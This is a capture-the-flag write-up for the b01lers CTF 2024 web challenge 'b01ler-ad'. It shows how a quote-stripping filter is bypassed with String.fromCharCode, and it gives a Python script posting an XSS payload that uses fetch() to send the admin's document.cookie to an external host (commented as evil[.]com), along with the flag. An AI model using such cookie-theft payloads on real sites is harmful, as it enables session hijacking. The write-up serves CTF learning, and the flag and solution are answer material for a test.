---
title: "b01ler-ad - b01lers CTF 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "b01ler-ad", "b01lers-ctf", "b01lers-ctf-2024", "2024", "ctf-writeup"]
summary: "<http://b01ler-ads.hammer.b01le.rs>"
source:
  name: "CTFtime writeup #39101"
  url: "https://ctftime.org/writeup/39101"
original_source: "https://xeunwa.github.io/b01lers-2024/#webb01ler-ad"
ctf:
  name: "b01lers CTF 2024"
  year: 2024
  challenge: "b01ler-ad"
---

## Metadata

- **CTF:** b01lers CTF 2024
- **Task:** b01ler-ad
- **Author team:** 25ji
- **CTFtime tags:** web, xss
- **CTFtime:** <https://ctftime.org/writeup/39101>
- **Original writeup:** <https://xeunwa.github.io/b01lers-2024/#webb01ler-ad>

---
# web/b01ler-ad  
> Ads Ads Ads! Cheap too! You want an Ad on our site? Just let us know!  
`<http://b01ler-ads.hammer.b01le.rs>`

XSS challenge - We are allowed to input any html data we want and the admin visits that but the content should not contain quotes, double quotes and backticks:

Main challenge  
```js  
const content = req.body.content.replace("'", '').replace('"', '').replace("`", '');  
const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;  
```

We can use `String.fromCharCode` <https://charcode98.neocities.org/> to avoid using quotes and encode our URL before sending it to the admin. Admin visits our site with their cookies in the query.

```python  
import requests  
url = '<http://b01ler-ads.hammer.b01le.rs/review'>

# fetch('evil[.]com?cookie'=document.cookie)  
payload = """  
<script>  
var url = String.fromCharCode(104, 116, 116, 112, 58...)  
fetch(url+ encodeURI(document.cookie))  
</script>  
"""

encoded = "%3Cscript%3E%0A%20%20%20%20let%20url%20%3D%20String%2EfromCharCode%28104%2C%20116%2C%20116%2C%20112%2C%2058%2E%2E%2E%29%0A%20%20%20%20fetch%28url%20%20encodeURI%28document%2Ecookie%29%29%0A%3C%2Fscript%3E"

data = {  
'content':encoded  
}

r = [requests.post](http://requests.post)(url, data=data)  
print(r.text)  
```

![listener](<https://xeunwa.github.io/b01lers-2024/image.png>)

**flag**: bctf{wow_you_can_get_a_free_ad_now!}
